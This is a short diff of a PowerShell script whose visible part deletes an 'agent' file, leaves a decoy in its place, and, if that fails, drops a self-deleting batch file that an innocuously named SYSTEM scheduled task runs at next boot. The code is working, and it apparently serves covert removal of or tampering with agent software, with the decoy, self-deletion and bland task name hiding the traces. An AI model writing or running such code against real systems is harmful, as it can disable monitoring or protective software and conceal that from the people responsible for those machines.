@@ -67,15 +67,17 @@ try {
     Write-Output "[+] Original agent file deleted (decoy remains)."
 } catch {
     Write-Output "[-] Original agent still exists – scheduling deletion on next reboot."
-    # Create a simple batch script to delete the file on next boot
+
+    # Create a simple batch file using an array of strings (no here‑string issues)
     $tempScript = "$env:TEMP\del_agent.bat"
-    # Use here-string for batch content
-    $batchContent = @"
-@echo off
-del /f /q "$agentPath"
-del /f /q "%~f0"
-"@
-    Set-Content -Path $tempScript -Value $batchContent -Encoding ASCII
+    $batchLines = @(
+        "@echo off",
+        "del /f /q `"$agentPath`"",
+        "del /f /q `"%~f0`""
+    )
+    $batchLines -join "`r`n" | Set-Content -Path $tempScript -Encoding ASCII
+
+    # Create a one‑time scheduled task to run at next boot
     schtasks /create /tn "TempCleanup" /tr "$tempScript" /sc once /st 00:00 /ru SYSTEM /f | Out-Null
 }
 
